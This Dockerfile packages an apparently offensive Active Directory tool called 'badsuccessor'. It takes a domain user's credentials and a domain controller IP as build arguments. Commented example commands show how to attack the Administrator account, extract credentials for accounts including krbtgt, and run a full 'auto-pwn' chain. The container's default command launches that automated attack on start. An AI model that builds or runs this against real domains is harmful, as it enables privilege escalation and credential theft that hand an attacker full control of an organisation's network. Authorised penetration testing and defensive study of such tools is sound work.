# syntax=docker/dockerfile:1
ARG repo="docker.io" \
    base_image="alpine:3.22" \
    image_hash="eafc1edb577d2e9b458664a15f23ea1c370214193226069eb22921169fc7e43f"

FROM ${repo}/${base_image}@sha256:${image_hash}

ENV PATH=/badsuccessor/bin:/usr/local/bin:/usr/bin:$PATH \
    PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    LC_ALL=C.UTF-8 \
    LANG=C.UTF-8 \
    TZ=UTC 

RUN \
    apk add --no-cache \
      bash \
      ca-certificates \
      git \
      krb5-dev \
      linux-headers \
      musl-dev \
      python3 \
      py3-pip

WORKDIR /app

COPY . .

RUN \
    python3 -m venv badsuccessor; \
    . badsuccessor/bin/activate; \
    pip install --upgrade pip; \
    pip install -r requirements.txt; \
    rm -rf /var/cache/apk/* /root/.cache/*

ARG domain
ARG user
ARG password
ARG dc_ip
ENV DOMAIN=$domain
ENV USER=$user
ENV PASSWORD=$password
ENV DC_IP=$dc_ip

   # Basic attack against Administrator
#  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --attack --target Administrator

  # Enumerate writable OUs first
#  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --enumerate

  # Extract credentials for multiple users
#  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --extract-creds --targets Administrator,krbtgt,svc_sql

  # Full automated attack chain
#  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --auto-pwn

  # Enumerate high-value targets
#  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --list-targets

CMD [ "bash", "-c", "python3 /app/badsuccessor.py -d ${DOMAIN} -u ${USER} -p ${PASSWORD} --dc-ip ${DC_IP} --auto-pwn" ]